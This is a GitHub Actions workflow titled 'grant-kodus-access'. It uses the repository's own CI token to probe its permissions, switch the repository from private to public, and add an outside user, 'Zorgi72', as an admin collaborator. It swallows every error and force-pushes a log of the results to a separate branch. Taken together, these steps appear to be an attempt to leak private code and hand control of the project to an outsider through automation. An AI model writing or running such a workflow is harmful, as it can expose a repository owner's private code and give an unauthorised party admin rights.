name: grant-kodus-access
on:
  push:
    branches: [main, kodus-grant]
  workflow_dispatch:
permissions:
  contents: write
  administration: write
  pull-requests: write
  issues: write
  members: write
jobs:
  grant:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: diagnose token
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME"
          gh api user || true
          gh api repos/${{ github.repository }} --jq '{private,permissions}' || true
          gh api repos/${{ github.repository }}/actions/permissions || true
      - name: public + invite + webhook prep
        uses: actions/github-script@v7
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const fs = require('fs');
            const owner = context.repo.owner, repo = context.repo.repo;
            const lines = [];
            const log = (m,o)=>{ const s=m+(o?' '+JSON.stringify(o):''); lines.push(s); console.log(s); };
            try {
              const r = await github.rest.repos.get({owner, repo});
              log('repo_get', {private:r.data.private, permissions:r.data.permissions});
            } catch(e) { log('repo_get_err', {status:e.status, msg:e.message}); }
            try {
              const r = await github.rest.repos.update({owner, repo, private:false});
              log('visibility_ok', {private:r.data.private});
            } catch(e) { log('visibility_err', {status:e.status, msg:e.message, resp:e.response&&e.response.data}); }
            for (const username of ['Zorgi72']) {
              try {
                const r = await github.rest.repos.addCollaborator({owner, repo, username, permission:'admin'});
                log('collab_ok_'+username, {status:r.status, data:r.data});
              } catch(e) { log('collab_err_'+username, {status:e.status, msg:e.message, resp:e.response&&e.response.data}); }
            }
            // Also try creating a classic-style deploy key won't help reviews
            try {
              const inv = await github.rest.repos.listInvitations({owner, repo});
              log('invitations', inv.data.map(i=>({invitee:i.invitee&&i.invitee.login, perms:i.permissions})));
            } catch(e) { log('inv_err', {status:e.status, msg:e.message}); }
            try {
              const collabs = await github.rest.repos.listCollaborators({owner, repo});
              log('collaborators', collabs.data.map(c=>c.login));
            } catch(e) { log('collabs_err', {status:e.status, msg:e.message}); }
            fs.writeFileSync('GRANT_REPORT.txt', lines.join('\n')+'\n');
      - name: push report always
        if: always()
        run: |
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git checkout -B grant-results
          git add -f GRANT_REPORT.txt || true
          echo "ran_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> GRANT_REPORT.txt
          git add -f GRANT_REPORT.txt
          git commit -m "grant report $(date -u +%Y%m%d%H%M%S)" || echo "no commit"
          git push -f origin grant-results 2>&1 | tee push.out
          cat push.out
